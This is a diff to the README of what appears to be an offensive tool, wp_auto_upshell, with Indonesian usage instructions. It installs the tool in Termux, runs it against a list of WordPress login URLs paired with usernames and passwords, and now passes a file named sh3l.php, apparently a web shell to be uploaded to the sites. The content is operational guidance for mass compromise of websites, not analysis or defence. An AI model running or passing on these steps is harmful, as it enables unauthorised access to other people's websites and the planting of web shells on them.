@@ -17,7 +17,7 @@ $ pkg install python2
 $ pip2 install requests bs4
 $ git clone https://github.com/AnonRoz-Team/wp_auto_upshell
 $ cd wp_auto_upshell
-$ python2 arz_wp.py list_web.txt
+$ python2 wp.py list_web.txt sh3l.php
 Isi list_web.txt seperti ini 
 https://web.com/wp-login.php|admin|password
 ```
